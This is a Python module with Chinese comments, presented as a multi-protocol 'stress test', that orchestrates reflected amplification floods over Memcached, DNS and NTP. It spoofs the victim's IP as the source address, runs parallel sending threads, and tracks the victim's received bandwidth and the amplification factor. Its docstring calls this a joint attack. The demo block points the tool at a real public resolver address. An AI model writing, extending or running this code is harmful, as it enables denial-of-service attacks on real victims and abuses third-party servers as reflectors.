"""
多协议联合压力测试模块（优化版）
支持 Memcached、DNS、NTP 协议的联合攻击
"""
import os
import time
import threading
import logging
from typing import Dict, List, Optional, Callable, Any
from threading import Lock

from modules.memcached_test import MemcachedTester
from modules.dns_test import DNSTester
from modules.ntp_test import NTPTester

logger = logging.getLogger(__name__)


class MultiProtocolTester:
    """多协议联合压力测试器（优化版）"""

    def __init__(self):
        self.is_running = False
        self.stats_callback = None
        self.test_threads = []
        self.stats_lock = Lock()

        # 测试统计信息（汇总）
        self.test_stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'current_pps': 0,
            'current_mbps': 0,
            'victim_mbps': 0.0,
            'max_amplification_factor': 0.0,
            'progress_percent': 0,
            'protocol_stats': {},      # 各协议独立统计
            'selected_protocols': []
        }

        self.start_time = 0
        self.end_time = 0
        self.selected_protocols = []
        self.remote_recv_mbps = 0.0
        self.remote_last_update = 0

        # 协议测试器实例（每个协议单独实例，避免状态干扰）
        self.testers = {}

    def run_test(self,
                 target_ip: str,
                 target_port: int = 80,
                 duration_minutes: int = 5,
                 total_threads: int = 8,
                 total_target_pps: int = 5000,
                 protocols: List[str] = None,
                 stats_callback: Optional[Callable[[Dict], None]] = None) -> None:
        """
        运行多协议联合测试（简化版：每个协议独立使用全部线程和PPS）
        """
        logger.info(f"开始多协议联合测试")
        logger.info(f"受害者: {target_ip}:{target_port}")
        logger.info(f"总线程数: {total_threads}, 总目标PPS: {total_target_pps}")

        self.is_running = True
        self.stats_callback = stats_callback
        self.start_time = time.time()
        self.end_time = self.start_time + (duration_minutes * 60)

        # 确定使用的协议
        if protocols is None:
            self.selected_protocols = ['memcached', 'dns', 'ntp']
        else:
            self.selected_protocols = protocols

        self.test_stats['selected_protocols'] = self.selected_protocols

        # 初始化各协议统计
        with self.stats_lock:
            self.test_stats['protocol_stats'] = {
                proto: {
                    'packets_sent': 0,
                    'current_pps': 0,
                    'current_mbps': 0,
                    'amplification_factor': 0
                } for proto in self.selected_protocols
            }

        # 为每个协议启动独立线程（每个协议使用完整的线程数和PPS，这样多协议时总流量是各协议之和）
        # 注意：如果系统性能不足，可能需要降低每个协议的PPS，但为了简单，先这样实现
        for protocol in self.selected_protocols:
            if not self.is_running:
                break

            logger.info(f"正在启动 {protocol.upper()} 测试器...")
            t = threading.Thread(
                target=self._run_single_protocol,
                args=(protocol, target_ip, target_port, duration_minutes, total_threads, total_target_pps)
            )
            t.daemon = True
            t.start()
            self.test_threads.append(t)

        # 启动全局统计更新线程
        stats_thread = threading.Thread(target=self._global_stats_updater)
        stats_thread.daemon = True
        stats_thread.start()
        self.test_threads.append(stats_thread)

        # 等待测试结束（主线程阻塞）
        while self.is_running and time.time() < self.end_time:
            time.sleep(1)

        self.stop_test()
        logger.info("多协议联合测试结束")

    def _run_single_protocol(self, protocol: str, target_ip: str, target_port: int,
                             duration_minutes: int, threads: int, target_pps: int):
        """运行单个协议测试，并捕获其统计"""
        try:
            # 创建对应协议的测试器
            if protocol == 'dns':
                tester = DNSTester()
            elif protocol == 'ntp':
                tester = NTPTester()
            elif protocol == 'memcached':
                tester = MemcachedTester()
            else:
                logger.error(f"不支持的协议: {protocol}")
                return

            self.testers[protocol] = tester

            # 定义该协议的回调函数，用于更新汇总统计
            def protocol_callback(stats_dict):
                self._merge_protocol_stats(protocol, stats_dict)

            logger.info(f"{protocol.upper()} 测试器开始运行 (线程={threads}, PPS={target_pps})")
            tester.run_test(
                target_ip=target_ip,
                target_port=target_port,
                duration_minutes=duration_minutes,
                threads=threads,
                target_pps=target_pps,
                spoof_source_ip=target_ip,
                spoof_source_port=target_port,
                stats_callback=protocol_callback
            )
            logger.info(f"{protocol.upper()} 测试器运行完成")

        except Exception as e:
            logger.error(f"{protocol} 测试线程异常: {str(e)}", exc_info=True)

    def _merge_protocol_stats(self, protocol: str, stats: Dict):
        """将单个协议的统计合并到全局统计中"""
        with self.stats_lock:
            # 更新该协议的独立统计
            if protocol not in self.test_stats['protocol_stats']:
                self.test_stats['protocol_stats'][protocol] = {
                    'packets_sent': 0,
                    'current_pps': 0,
                    'current_mbps': 0,
                    'amplification_factor': 0
                }

            # 增量更新（注意：packets_sent 是累计值，直接读最新值即可，不需要累加）
            self.test_stats['protocol_stats'][protocol]['packets_sent'] = stats.get('packets_sent', 0)
            self.test_stats['protocol_stats'][protocol]['current_pps'] = stats.get('current_pps', 0)
            self.test_stats['protocol_stats'][protocol]['current_mbps'] = stats.get('current_mbps', 0)
            self.test_stats['protocol_stats'][protocol]['amplification_factor'] = stats.get('max_amplification_factor', 0)

            # 重新计算总发送包数和总字节数（各协议累加）
            total_packets = sum(p['packets_sent'] for p in self.test_stats['protocol_stats'].values())
            total_bytes = sum(p['packets_sent'] * 120 for p in self.test_stats['protocol_stats'].values())  # 估算，实际可从各协议获取
            self.test_stats['packets_sent'] = total_packets
            self.test_stats['bytes_sent'] = total_bytes

            # 总 PPS 和总带宽（各协议当前速率之和）
            total_pps = sum(p['current_pps'] for p in self.test_stats['protocol_stats'].values())
            total_mbps = sum(p['current_mbps'] for p in self.test_stats['protocol_stats'].values())
            self.test_stats['current_pps'] = total_pps
            self.test_stats['current_mbps'] = total_mbps

            # 受害机接收带宽（取最新值，多个协议可能都会上报，取最大值）
            victim_mbps = stats.get('victim_mbps', 0.0)
            if victim_mbps > self.test_stats['victim_mbps']:
                self.test_stats['victim_mbps'] = victim_mbps
                self.remote_recv_mbps = victim_mbps
                self.remote_last_update = time.time()

            # 最大放大倍数（取各协议中的最大值）
            max_af = max(p['amplification_factor'] for p in self.test_stats['protocol_stats'].values())
            self.test_stats['max_amplification_factor'] = max_af

    def _global_stats_updater(self):
        """定期向客户端推送汇总统计"""
        logger.debug("多协议全局统计更新线程启动")
        last_update = time.time()

        while self.is_running and time.time() < self.end_time:
            try:
                time.sleep(1)  # 每秒更新一次，更实时
                now = time.time()
                elapsed = now - self.start_time
                total = self.end_time - self.start_time
                progress = min(100, (elapsed / total) * 100) if total > 0 else 0

                with self.stats_lock:
                    self.test_stats['progress_percent'] = progress
                    # 新鲜度判断
                    is_fresh = (now - self.remote_last_update) < 3.0 if self.remote_last_update > 0 else False

                    if self.stats_callback:
                        stats_copy = self.test_stats.copy()
                        stats_copy.update({
                            'victim_mbps': self.remote_recv_mbps,
                            'max_amplification_factor': self.test_stats['max_amplification_factor'],
                            'progress_percent': progress,
                            'is_data_fresh': is_fresh,
                            'selected_protocols': self.selected_protocols
                        })
                        self.stats_callback(stats_copy)

                last_update = now

            except Exception as e:
                logger.error(f"全局统计更新错误: {e}")

        logger.debug("多协议全局统计更新线程结束")

    def stop_test(self):
        """停止所有子测试"""
        self.is_running = False
        logger.info("正在停止多协议测试...")
        for protocol, tester in self.testers.items():
            if tester and hasattr(tester, 'stop_test'):
                try:
                    tester.stop_test()
                except Exception as e:
                    logger.warning(f"停止 {protocol} 测试器时出错: {e}")

    def cleanup(self):
        """清理所有测试器"""
        self.stop_test()
        for protocol, tester in self.testers.items():
            if tester and hasattr(tester, 'cleanup'):
                try:
                    tester.cleanup()
                except Exception as e:
                    logger.warning(f"清理 {protocol} 测试器时出错: {e}")
        self.testers.clear()
        logger.info("多协议测试资源已清理")

    def get_stats(self):
        """获取当前统计信息"""
        with self.stats_lock:
            return self.test_stats.copy()


# 以下为单元测试代码（可选）
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    tester = MultiProtocolTester()

    def cb(stats):
        print(f"\r总PPS: {stats['current_pps']:.0f} 总Mbps: {stats['current_mbps']:.1f} 进度: {stats['progress_percent']:.0f}%", end="")

    try:
        tester.run_test(
            target_ip="8.8.8.8",   # 注意：这里必须是你的测试目标，仅做演示
            target_port=80,
            duration_minutes=0.2,
            total_threads=4,
            total_target_pps=1000,
            protocols=['dns', 'ntp'],  # 可以先测试 dns 和 ntp
            stats_callback=cb
        )
        print("\n测试完成")
    except KeyboardInterrupt:
        tester.stop_test()
    finally:
        tester.cleanup()